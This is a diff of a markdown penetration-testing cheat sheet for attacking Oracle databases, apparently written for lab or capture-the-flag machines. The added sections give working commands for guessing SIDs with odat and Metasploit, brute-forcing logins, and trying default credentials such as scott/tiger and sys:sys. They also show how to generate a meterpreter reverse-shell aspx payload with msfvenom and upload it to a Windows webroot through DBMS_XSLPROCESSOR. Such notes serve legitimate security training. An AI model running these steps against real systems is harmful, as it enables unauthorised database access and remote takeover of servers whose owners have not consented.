@@ -1,46 +1,64 @@
 ### Oracle
 
-#### 1521
-***tool*** https://tools.kali.org/vulnerability-analysis/tnscmd10g
-- tnscmd10g version -h [victim_ip]
-- tnscmd10g status -h [vitcim_ip]
+#### Service on port 1521 
  
-##### usefull tools set
+- Usefull tool set
 - https://www.oracle.com/pl/database/technologies/instant-client/winx64-64-downloads.html
+--------------------------------------------------------------------------------------------------------------------------------------------------------------
+#### Identify SIDs
 
-- Identify SIDs
+Identify SIDs via odat.py tool
 ```
+apt-get install odat
 odat sidguesser -s <victim_ip>
 ```
-### default credentials
-scott:trger
 
-Check databae
+Valid SID brute forcing via metasploit
 ```
-sqlplus SCOTT/tiger@10.10.10.82:1521/<XE> depends SID
+msf > use auxiliary/admin/oracle/sid_brute 
+msf auxiliary(admin/oracle/sid_brute) > set rhost <victim_ip>
+msf auxiliary(admin/oracle/sid_brute) > run
+```
+--------------------------------------------------------------------------------------------------------------------------------------------------------------
+#### Brute force credentials 
+
+Brute force credentials via metasploit
+```
+msf > use auxiliary/admin/oracle/oracle_login
+msf auxiliary(admin/oracle/oracle_login) > set sid (for example XE)
+msf auxiliary(admin/oracle/oracle_login) > set rhost <victim_ip>
+msf auxiliary(admin/oracle/oracle_login) > run
+```
+Get credentials with other way
+#TODO!
+--------------------------------------------------------------------------------------------------------------------------------------------------------------
+#### Check options with odat
+```
+odat all -s <victim_ip> -d XE -U scott -P tiger --sysdba
+```
+**For exmaple search DBMS_XSLPROCESSOR library(this options allows us to put any files onto the machine**
+--------------------------------------------------------------------------------------------------------------------------------------------------------------
+#### PUT aspx file in the machine
+
+Generate payload
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<my_ip> LPORT=<my_port> -f aspx > rs_file.aspx
 ```
 
-db PrivEsc
+PUT payload
 ```
-SQL> select * from user_role_privs;
-```
+odat dbmsxslprocessor -s <victim_ip> -d XE -U scott -P tiger --putFile "C://inetpub//wwwroot//" t.aspx /full/path/for/local/aspx/file --sysdba
 
-check  privs with sysdba 
+C://inetpub//wwwroot// : victim path, example for this case
+t.aspx: example shell name
+XE: example SIDs
 ```
-SQL> sqlplus SCOTT/tiger@10.10.10.82:1521/XE as sysdba
-```
-
-check for upload permission
-```
-
-```
-#TO DO
-
-#### 2100
+--------------------------------------------------------------------------------------------------------------------------------------------------------------
+#### Port 2100
 ```
 credentials:
 sys:sys
-scott:trger
+scott:tiger
 ```
 
 ### resources
